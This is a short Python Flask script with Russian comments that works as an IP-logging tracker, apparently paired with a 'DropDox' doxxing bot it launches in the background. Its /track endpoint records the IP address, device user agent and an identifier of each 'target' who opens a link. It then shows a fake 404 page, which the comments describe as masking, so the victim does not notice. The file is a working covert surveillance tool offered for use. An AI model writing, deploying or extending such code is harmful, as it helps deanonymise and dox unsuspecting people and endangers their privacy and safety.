import os
import subprocess
import threading
from flask import Flask, request

# --- БЛОК ЗАПУСКА БОТА ---
def run_bot():
    """Функция для запуска бота в отдельном потоке"""
    print("--- [SYSTEM] Запуск бота DropDox в фоне... ---")
    # Используем subprocess.call, чтобы процесс жил внутри потока
    try:
        subprocess.call(["python3", "dropdox_bot.py"])
    except Exception as e:
        print(f"--- [ERROR] Ошибка при запуске бота: {e} ---")

# Запускаем бота еще до инициализации Flask, чтобы он стартовал сразу
bot_thread = threading.Thread(target=run_bot, daemon=True)
bot_thread.start()

# --- БЛОК FLASK (ЛОГГЕР) ---
app = Flask(__name__)

@app.route('/track')
def track():
    # Получаем данные цели
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    target_id = request.args.get('id', 'unknown')

    # Вывод в логи Railway (ты увидишь это в панели управления)
    print(f"\n🎯 !!! TARGET CAUGHT !!!")
    print(f"🆔 ID: {target_id}")
    print(f"🌐 IP: {user_ip}")
    print(f"📱 DEVICE: {user_agent}\n")

    # Возвращаем фейковую ошибку для маскировки
    return "<h1>404 Not Found</h1><p>The requested URL was not found on this server.</p>", 404

@app.route('/')
def home():
    return "Service is running", 200

if __name__ == '__main__':
    # Railway сам назначит порт через переменную окружения PORT
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
    
